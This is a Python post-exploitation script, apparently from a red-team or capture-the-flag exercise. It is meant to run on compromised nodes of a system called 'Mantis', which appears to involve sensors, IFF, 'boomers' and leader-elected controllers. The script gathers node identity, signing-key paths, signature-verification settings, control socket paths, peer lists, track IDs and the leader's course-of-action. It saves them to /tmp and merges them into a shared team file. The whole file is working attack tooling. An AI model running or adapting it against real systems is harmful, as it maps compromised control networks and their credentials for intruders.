"""save_recon.py - extract and persist recon data to JSON for team use.

Run on any compromised Mantis node. Saves node identity, peers, socket
paths, track IDs, and COA to /tmp/recon_<node_id>.json.

Usage:
    python3 save_recon.py
    python3 save_recon.py /tmp/my_output.json
"""

import json
import os
import sqlite3
import sys
import time

# Import mantis primitives directly
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mantis import (
    load_config, check_leader, local_track_ids,
    _resolve_track_db, sensor_endpoints,
)

OUT_DIR = "/tmp"


def collect(cfg, ntype, path):
    node_id = cfg.get("id", "unknown")

    data = {
        "collected_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "config_path":  path,
        "node_type":    ntype,
        "node_id":      node_id,
        "iff":          cfg.get("iff"),
        "listen_address": cfg.get("listen_address"),
        "listen_port":    cfg.get("listen_port"),
        "verify_signatures": cfg.get("verify_signatures"),
        "key_path":      cfg.get("key_path"),

        # Sockets
        "sockets": {
            "comms":    cfg.get("comms_socket_path"),
            "election": cfg.get("election_socket_path"),
            "hw":       cfg.get("hw_socket_path"),
        },

        # Peers
        "controllers": cfg.get("controllers") or [],
        "sensors":     cfg.get("sensors") or [],
        "boomers":     cfg.get("boomers") or [],

        # Sensor-specific
        "track_db_path": None,
        "track_ids":     [],

        # Controller-specific
        "coa":           None,
        "is_leader":     False,

        # Derived
        "sensor_endpoints": sensor_endpoints(cfg),
    }

    # Track DB + IDs (sensor nodes)
    db = _resolve_track_db(cfg)
    if db:
        data["track_db_path"] = db
        data["track_ids"] = local_track_ids(cfg)

    # Leadership + COA (controller nodes)
    es = cfg.get("election_socket_path")
    if es:
        coa = check_leader(es)
        if coa and coa.get("endorsements"):
            data["is_leader"] = True
            data["coa"] = coa

    return data


def main():
    cfg, ntype, path = load_config()
    if not cfg:
        print("[!] No Mantis config found.")
        sys.exit(2)

    data = collect(cfg, ntype, path)

    node_id = data["node_id"]
    out_path = sys.argv[1] if len(sys.argv) > 1 \
        else os.path.join(OUT_DIR, f"recon_{node_id}.json")

    with open(out_path, "w") as f:
        json.dump(data, f, indent=2)

    print(f"[+] Saved to {out_path}")
    print(f"    node_id:     {data['node_id']}")
    print(f"    node_type:   {data['node_type']}")
    print(f"    is_leader:   {data['is_leader']}")
    print(f"    track_ids:   {len(data['track_ids'])} found")
    print(f"    controllers: {len(data['controllers'])}")
    print(f"    sensors:     {len(data['sensors'])}")
    print(f"    boomers:     {len(data['boomers'])}")

    # Also append to a shared team file so all nodes feed one place
    team_file = os.path.join(OUT_DIR, "recon_all.json")
    try:
        with open(team_file) as f:
            all_data = json.load(f)
    except Exception:
        all_data = {}

    all_data[node_id] = data

    with open(team_file, "w") as f:
        json.dump(all_data, f, indent=2)

    print(f"[+] Also merged into {team_file}")


if __name__ == "__main__":
    main()